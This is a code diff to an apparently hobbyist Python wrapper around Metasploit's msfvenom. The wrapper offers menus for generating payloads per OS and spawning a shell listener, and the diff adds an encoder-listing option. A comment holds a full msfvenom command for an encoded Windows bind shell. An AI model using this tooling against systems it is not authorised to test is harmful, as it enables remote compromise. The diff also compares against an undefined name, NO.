@@ -2,6 +2,8 @@ import os, sys
 
 #msfvenom -a x86 --platform windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python
 
+use_advanced = 0
+
 def banner():
 	os.system("clear")
 	print "============================"
@@ -31,7 +33,9 @@ def checkForMetasploit():
 		print "dude.... dont even try...\n\n"
 		os.sleep(2)
 		print 'JK JK. Install metasploit first and if it is installed. Make sure its in your PATH varible'
-		sys.exit()
+		answer = createAndShowMenu("Continue ?",["YES","NO"])
+		if answer == NO:
+			sys.exit()
 
 #this is a menu creator that just handles number input
 def createAndShowMenu(prompt,items):
@@ -59,7 +63,7 @@ def createAndShowMenu(prompt,items):
 			
 	
 def optionPicker():
-	ostype=["Settings","Windows","OSX","Linux","android","list-formats","list-platforms"]
+	ostype=["Settings","Windows","OSX","Linux","android","list-formats","list-platforms","list-encoders"]
 	osprompt="Pick an OS, any OS :D"
 
 	choice = createAndShowMenu(osprompt,ostype)
@@ -96,7 +100,8 @@ def optionPicker():
 	if choice =="list-platforms":
 		platformList=["javascript", "python", "nodejs", "firefox", "mainframe", "php", "unix", "netware", "irix", "android", "hpux", "java", "aix", "ruby", "freebsd", "netbsd", "linux", "bsdi", "cisco", "openbsd", "osx", "solaris", "bsd", "windows"]
 		print platformList
-
+	if choice == "list-encoders":
+		list_encoders()
 
 def setShellcodeOptions(chosenPayload, payloadList, platform):
 	LHOST="0.0.0.0"
@@ -167,6 +172,12 @@ def spawnListener():
 	print "==========================="
 	print "  LISTENIN FOR DEM SHELLS  "
 	print "==========================="
+
+	
+
+def list_encoders():
+	os.system('msfvenom -l encoders')
+
 
 
 
